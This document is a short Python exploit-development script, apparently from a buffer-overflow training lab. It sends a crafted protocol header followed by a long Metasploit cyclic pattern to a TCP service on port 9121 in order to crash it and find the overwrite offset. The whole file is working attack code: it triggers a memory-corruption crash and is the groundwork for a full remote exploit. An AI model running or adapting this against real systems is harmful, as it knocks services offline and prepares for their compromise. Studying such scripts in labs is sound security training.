#!/usr/bin/env python3

import socket
import sys
import subprocess
from struct import pack

try:
    if len(sys.argv) < 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]

    if len(sys.argv) < 3:
        port = 9121
    else:
        port = int(sys.argv[2])

    if len(sys.argv) < 4:
        size = 1000
    else:
        size = int(sys.argv[3])

    print("Usage: {} [TARGET] [PORT] [SIZE]".format(sys.argv[0]))
    print("TARGET: {}".format(server))
    print("PORT: {}".format(str(port)))
    print("SIZE: {}".format(str(size)))

    # inputBuffer = b"\x41" * size
    inputBuffer = bytes(subprocess.check_output(["/usr/bin/msf-pattern_create", "-l", str(size)]).strip())

    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])

    buf = header + inputBuffer

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")